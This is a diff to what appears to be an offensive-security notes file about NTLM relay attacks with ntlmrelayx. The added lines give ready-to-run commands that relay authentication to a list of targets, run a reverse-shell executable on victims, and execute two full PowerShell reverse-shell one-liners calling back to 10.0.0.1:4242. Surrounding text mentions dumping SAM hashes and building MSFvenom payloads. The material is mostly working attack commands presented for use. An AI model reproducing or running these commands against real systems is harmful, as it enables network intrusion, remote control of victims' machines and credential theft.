@@ -331,6 +331,22 @@ Note: targets.txt contains the IP addresses of who we want to attack. without th
 -e example.exe: execute example.exe
 -c ls: run command ls
 ```
+#### Execute Example:
+assuming reverseshell.exe is a file on you attack machine that you want the victim to run
+```
+ntmlrelayx.py -tf targets.txt -smb2support -e reverseshell.exe
+```
+
+#### Command Example:
+the command will run on the victim machine
+```
+ntmlrelayx.py -tf targets.txt -smb2support -c "whoami"
+
+ntmlrelayx.py -tf targets.txt -smb2support -c 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
+
+ntmlrelayx.py -tf targets.txt -smb2support -c 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+```
+
 looking for it to dump SAM hashes or give you and SMB client shell for the known user. can use MSFvenom to create an executable payload and get reverse shell. or create a powershell script or CMD to run as a command to get a reverse shell or do something. 
 
 ### Interactive Shell:
